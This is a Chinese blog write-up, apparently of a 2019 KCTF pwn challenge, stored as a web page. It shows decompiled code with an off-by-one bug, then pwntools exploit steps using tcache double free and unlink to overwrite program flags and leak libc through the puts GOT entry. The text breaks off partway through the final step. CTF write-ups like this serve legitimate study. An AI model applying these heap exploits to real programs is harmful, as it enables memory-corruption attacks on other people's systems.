@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn-unlink,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="入门不久的pwn菜鸟也不敢去打比赛，这几天在看ctf-wiki上面的unlink，已经调了几道题，但是印象还是不是很深刻，之前听实验室的小伙伴说的时候听到有到unlink的题，来做做看看。但是玩玩没想到的是这道题要用到tcache，对我这个还没学到tcache的人来说，又回去把tcache学了，但是呢，在看tcache的时候往往又结合了unsorted bin attack的利用。兜兜转转，三天">
+<meta name="keywords" content="pwn-unlink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 kctf 沉睡的敦煌 writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/06/28/2019-kctf-沉睡的敦煌-writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="入门不久的pwn菜鸟也不敢去打比赛，这几天在看ctf-wiki上面的unlink，已经调了几道题，但是印象还是不是很深刻，之前听实验室的小伙伴说的时候听到有到unlink的题，来做做看看。但是玩玩没想到的是这道题要用到tcache，对我这个还没学到tcache的人来说，又回去把tcache学了，但是呢，在看tcache的时候往往又结合了unsorted bin attack的利用。兜兜转转，三天">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-11T00:58:02.618Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 kctf 沉睡的敦煌 writeup">
+<meta name="twitter:description" content="入门不久的pwn菜鸟也不敢去打比赛，这几天在看ctf-wiki上面的unlink，已经调了几道题，但是印象还是不是很深刻，之前听实验室的小伙伴说的时候听到有到unlink的题，来做做看看。但是玩玩没想到的是这道题要用到tcache，对我这个还没学到tcache的人来说，又回去把tcache学了，但是呢，在看tcache的时候往往又结合了unsorted bin attack的利用。兜兜转转，三天">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/06/28/2019-kctf-沉睡的敦煌-writeup/">
+
+
+
+
+
+  <title>2019 kctf 沉睡的敦煌 writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/06/28/2019-kctf-沉睡的敦煌-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019 kctf 沉睡的敦煌 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-28T00:00:00+08:00">
+                2019-06-28
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:58:02+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>入门不久的<code>pwn</code>菜鸟也不敢去打比赛，这几天在看<code>ctf-wiki</code>上面的<code>unlink</code>，已经调了几道题，但是印象还是不是很深刻，之前听实验室的小伙伴说的时候听到有到<code>unlink</code>的题，来做做看看。但是玩玩没想到的是这道题要用到tcache，对我这个还没学到tcache的人来说，又回去把tcache学了，但是呢，在看tcache的时候往往又结合了unsorted bin attack的利用。兜兜转转，三天后继续来看这道题。</p>
+</blockquote>
+<p>这道题用到的利用方式有：<code>unlink</code>，<code>Tcache double free</code>。</p>
+<h3 id="查看程序基本信息"><a href="#查看程序基本信息" class="headerlink" title="查看程序基本信息"></a>查看程序基本信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@a7f3b80cb67c:/home/docker/pwnable/SleepingDunhuang/SleepingDunhuang<span class="comment"># file pwn</span></span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=8c566c2a4768c4601d2de21755b6ba03503148f6, stripped</span><br><span class="line">root@a7f3b80cb67c:/home/docker/pwnable/SleepingDunhuang/SleepingDunhuang<span class="comment"># checksec pwn</span></span><br><span class="line">[*] <span class="string">'/home/docker/pwnable/SleepingDunhuang/SleepingDunhuang/pwn'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>程序是64位动态链接，开启了canary和nx保护。</p>
+</blockquote>
+<h3 id="程序基本逻辑"><a href="#程序基本逻辑" class="headerlink" title="程序基本逻辑"></a>程序基本逻辑</h3><p>拖进<code>ida</code>查看程序基本逻辑</p>
+<h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">malloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *addr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">  index = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">31</span> || content_ptr[index] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int64)addr &lt; init_malloc_ptr || (<span class="keyword">signed</span> __int64)addr &gt; init_malloc_ptr + <span class="number">2048</span> )<span class="comment">// 分配的地址只能在指定的范围内</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  content_ptr[index] = addr;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"gift: %llx\n"</span>, content_ptr[index]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, content_ptr[index], <span class="number">0x29</span>uLL); <span class="comment">// 堆块大小为0x28，但是读取的长度最大为0x29，存在offbyone</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在程序的初始化时分配了一个<code>0x30</code>大小的堆块，并且限制最多只能分配<code>32</code>个<code>0x28</code>大小的堆块，地址<code>addr</code>限定在<code>[init_malloc_ptr,init_malloc_ptr_2048]</code>范围内。在读取<code>content</code>时最多可以读取<code>0x29</code>字节，存在一个字节的溢出。</p>
+<p>####free()</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">my_free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v1 = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">31</span> || !content_ptr[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(content_ptr[v1]);</span><br><span class="line">  content_ptr[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>根据指定的索引释放堆块，并且释放之后将指针置为<code>null</code>。</p>
+</blockquote>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( edit_flg == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">  v2 = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">31</span> || !content_ptr[v2] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">  v0 = content_ptr[v2];</span><br><span class="line">  read(<span class="number">0</span>, content_ptr[v2], <span class="number">0x28</span>uLL);</span><br><span class="line">  ++edit_flg;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>每个堆块限制了只允许<code>edit</code>一次</p>
+</blockquote>
+<h4 id="show"><a href="#show" class="headerlink" title="show()"></a>show()</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( admin_show )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"index:"</span>);</span><br><span class="line">    v1 = read_num();</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">31</span> || !content_ptr[v1] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)content_ptr[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"only admin can use"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>之后<code>admin_show</code>为1的时候才能输出<code>content</code>内容。</p>
+</blockquote>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>这里需要用到两次tcache double free。具体过程如下：</p>
+<ol>
+<li><p>首先将Tcache bin 0x90的链表填满，这里利用off-by-one可以实现:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">44</span>     <span class="comment">#prepare for tcache double free</span></span><br><span class="line"><span class="number">45</span>     <span class="comment">#fill 0x90 tcache bin full</span></span><br><span class="line"><span class="number">46</span>     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"><span class="number">47</span>         malloc(<span class="number">2</span>*i,str(<span class="number">2</span>*i))</span><br><span class="line"><span class="number">48</span>         malloc(<span class="number">2</span>*i+<span class="number">1</span>,str(<span class="number">2</span>*i+<span class="number">1</span>))</span><br><span class="line"><span class="number">49</span>         free(<span class="number">2</span>*i)</span><br><span class="line"><span class="number">50</span>         malloc(<span class="number">2</span>*i,<span class="string">"a"</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)<span class="comment">#overwrite chunk[2*i+1]'s size to 0x90</span></span><br><span class="line"><span class="number">51</span>     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"><span class="number">52</span>         free(<span class="number">2</span>*i+<span class="number">1</span>)<span class="comment">#fill full 0x90 tcache bin</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>之后在释放的0x90的堆块就会被放入unsorted bin中。</p>
+</blockquote>
+</li>
+</ol>
+<ol start="2">
+<li><p>更改堆块地址的限制，先利用tcache double free将堆块分配到init_malloc_ptr的位置，构造需要unlink的fake chunk。但是先不要触发unlink，不然之后的布局会check 不过。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tcache double free</span></span><br><span class="line"><span class="comment">#make two pointers point to same address</span></span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'1111'</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="string">'3333'</span>)<span class="comment">#old 3</span></span><br><span class="line">malloc(<span class="number">5</span>,<span class="string">'5555'</span>)</span><br><span class="line">malloc(<span class="number">7</span>,<span class="string">'7777'</span>)</span><br><span class="line">malloc(<span class="number">9</span>,<span class="string">'9999'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)<span class="comment">#overwrite 5's size to 0x91</span></span><br><span class="line">free(<span class="number">3</span>)<span class="comment">#5 will put into unsorted bin</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="string">'3333'</span>)<span class="comment">#new 3's address is same with old 3,unsorted bin chunk's size is 0x60</span></span><br><span class="line">malloc(<span class="number">11</span>,<span class="string">'11'</span>)<span class="comment">#now 11' address same with 5</span></span><br><span class="line">heap_ptr = malloc(<span class="number">13</span>,<span class="string">'13'</span>)<span class="comment">#unsorted bin is empty now</span></span><br><span class="line">      </span><br><span class="line">init_malloc_ptr = heap_ptr<span class="number">-0x370</span></span><br><span class="line">print(hex(init_malloc_ptr))    </span><br><span class="line">pinit_malloc_ptr = <span class="number">0x404060</span></span><br><span class="line">   </span><br><span class="line">malloc(<span class="number">14</span>,<span class="string">'14'</span>)</span><br><span class="line"><span class="comment">#cause tcache double free</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#now tcache bin[0x30]-&gt;5&gt;13-&gt;11-&gt;14</span></span><br><span class="line">   </span><br><span class="line">malloc(<span class="number">5</span>,p64(init_malloc_ptr))<span class="comment">#11'fd is pinit_malloc_ptr</span></span><br><span class="line">malloc(<span class="number">13</span>,<span class="string">'13'</span>)</span><br><span class="line">malloc(<span class="number">11</span>,<span class="string">'11'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#preapare fake chunk for unlink, pinit_malloc_ptr = pinit_malloc_ptr-0x18</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#14 will aclloc to init_malloc_ptr</span></span><br><span class="line">malloc(<span class="number">14</span>,<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x421</span>)+p64(pinit_malloc_ptr<span class="number">-0x18</span>)+p64(pinit_malloc_ptr<span class="number">-0x10</span>))</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li><p>再次构造tache double free。将Tcache 中的指针改成0x404170，这样在unlink之后，在进行malloc就会分配到0x404170的位置，就可以修改show，edit标志位了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#the second tcache double free</span></span><br><span class="line">    <span class="comment">#make 22 and 26 point to same address</span></span><br><span class="line">    malloc(<span class="number">20</span>,<span class="string">'20'</span>)</span><br><span class="line">    malloc(<span class="number">21</span>,<span class="string">'21'</span>)</span><br><span class="line">    malloc(<span class="number">22</span>,<span class="string">'22'</span>)</span><br><span class="line">    malloc(<span class="number">23</span>,<span class="string">'23'</span>)</span><br><span class="line">    malloc(<span class="number">24</span>,<span class="string">'24'</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    malloc(<span class="number">20</span>,<span class="string">'c'</span>*<span class="number">0x28</span>+<span class="string">'\x91'</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    malloc(<span class="number">25</span>,<span class="string">'25'</span>)</span><br><span class="line">    malloc(<span class="number">26</span>,<span class="string">'26'</span>)</span><br><span class="line">    malloc(<span class="number">27</span>,<span class="string">'27'</span>)</span><br><span class="line">    malloc(<span class="number">28</span>,<span class="string">'28'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#tcache double free</span></span><br><span class="line">    free(<span class="number">28</span>)</span><br><span class="line">    free(<span class="number">26</span>)</span><br><span class="line">    free(<span class="number">27</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    <span class="comment">#now tcache bin[0x30]-&gt;22&gt;27-&gt;26-&gt;28</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now 26's fd point to 0x404170</span></span><br><span class="line">    malloc(<span class="number">22</span>,p64(<span class="number">0x404170</span>))</span><br><span class="line">    malloc(<span class="number">27</span>,<span class="string">'27'</span>)</span><br><span class="line">    malloc(<span class="number">26</span>,<span class="string">'26'</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="4">
+<li><p>free(16)触发unlink，将堆块分配地址的限制改成0x404048~0x404048+0x800</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#trigger unlink, change limit of adddre to 0x404048~0x404048+0x800</span></span><br><span class="line">free(<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="5">
+<li><p>泄漏libc，更改show和edit标志位限制。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="comment">#array[30]'s heap_addr overwrite into puts_addr,array[31]'</span></span><br><span class="line">    <span class="comment">#heap_addr overwrite into 0x40170(array[30]), </span></span><br><span class="line">    <span class="comment">#and 32 heap chunk's show flag overwrite into 1</span></span><br><span class="line">    malloc(<span class="number">28</span>,p64(pwn.got[<span class="string">'puts'</span>])+p64(<span class="number">0x404170</span>)+<span class="string">'\x77'</span>*<span class="number">0x10</span>)</span><br><span class="line">  <span class="comment">#  gdb.attach(p)</span></span><br><span class="line">  